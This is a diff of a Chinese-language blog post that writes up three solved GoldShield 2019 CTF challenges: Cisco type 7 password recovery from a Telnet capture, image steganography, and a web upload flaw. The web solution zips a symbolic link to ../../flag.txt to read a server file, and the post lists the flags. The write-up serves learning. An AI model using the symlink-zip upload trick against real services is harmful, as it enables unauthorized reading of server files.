@@ -7,7 +7,7 @@ tags: [ctf, GoldShield]
 comments: false
 ---
 
-## Overviews
+# Overviews
 
 我們這隊只有解出三題，題目跟通靈沒兩樣，都靠隊友 carry ，這裡就來寫一下 `Game 4` `Game 7` `Game 8`
 
@@ -15,22 +15,28 @@ comments: false
 
 ---
 
-## Writeup
-### Game4
-#### Problem
+# Writeup
+
+## Game4
+#### Misc
+### Problem
 ```
 某公司已經成立逾20年,公司累積了不少專利資料 ; 但公司的網路管理者,一直使用未加密協定TELNET連線到網路設備的管理介面(IP:10.17.0.10)。商業問謀小明為了竊取該公司的機密,倫倫次錄了一段網路管理者登錄設備的封包檔,並嘗試破解該公司路由設備。
 ```
 
-#### Hint
+### Hint
 ```
 透過封包解析找出可登入設備的一般使用者帳密,再以cisco Cracker取得ENABLE密碼(Flag即為ENABLE密碼)。
 ```
-[封包檔]() 之後補上
+[封包檔.pcap](/files/goldshield2019/game4.pcap)
 
-#### Solve
+### Solve
 
-用 wireshark 打開封包，會看到 `enable password 7 07282E404A434B55464B`
+![wireshark](https://i.imgur.com/Uicju4I.png)
+
+用 wireshark 打開封包，會看到 running config
+
+其中 `enable password 7 07282E404A434B55464B` 應該就是 enable password 了
 
 碰過 cisco packet tracer 應該都知道這種是 type 7 的加密，在網路上找 `Cisco Type 7 Password Decrypt` 來解
 
@@ -41,15 +47,16 @@ Gold*2019
 
 ---
 
-### Game 7
-#### Problem
+## Game 7
+#### Stego
+### Problem
 ```
 皮卡丘似乎在尋找一些隱藏的檔案 ,相信只要找到它們並且破解其中的密文。就能得到最後的解答
 ```
 
 [PikaPika.jpg](/files/goldshield2019/PikaPika.jpg)
 
-#### Solve
+### Solve
 
 ```
 # analysis file with binwalk
@@ -77,6 +84,7 @@ $ tree
 ```
 
 key 打開之後貌似是一段歌詞
+
 ```
 $ cat key.txt
 Never give up,
@@ -100,16 +108,17 @@ pjd{gwtpjsymjxmnjqi}
 
 ![flag](/files/goldshield2019/game7flag.jpg)
 
-#### Flag
+### Flag
+
 ```
 HaVe A Good Day!!
 ```
 
 ---
 
-### Game 8
-
-#### Problem
+## Game 8
+#### Web
+### Problem
 ```
 悟毛是個網路言論審查員,今天接獲線民舉報 ,某網站疑似學握了元首不可告人的秘密,請在秘密被外洩前幫悟毛找出這個秘密吧。IP:10.17.15.246
 ```
@@ -117,24 +126,25 @@ HaVe A Good Day!!
 
 hint 寫 link to target
 
-經過通靈之後發現應該是用 Linux 建立一個 soft link (symbolic link)，然後打包成一個 zip 傳上去``
+經過通靈之後發現應該是用 Linux 建立一個 soft link (symbolic link)，然後打包成一個 zip 傳上去
 
-#### Solve
+### Solve
 
 ```
 $ ln -s ../../flag.txt 123
 $ zip 123.zip 123
 ```
+
 傳上zip檔 flag 就噴出來了
 
-#### Flag
+### Flag
 ```
 winniecute
 ```
 
 ---
 
-## 合照
+# 合照
 跟主辦單位拿了12萬的板子自嗨了一下 （\\CSY教我/）
 
 ![photo](/files/goldshield2019/photo.jpg)
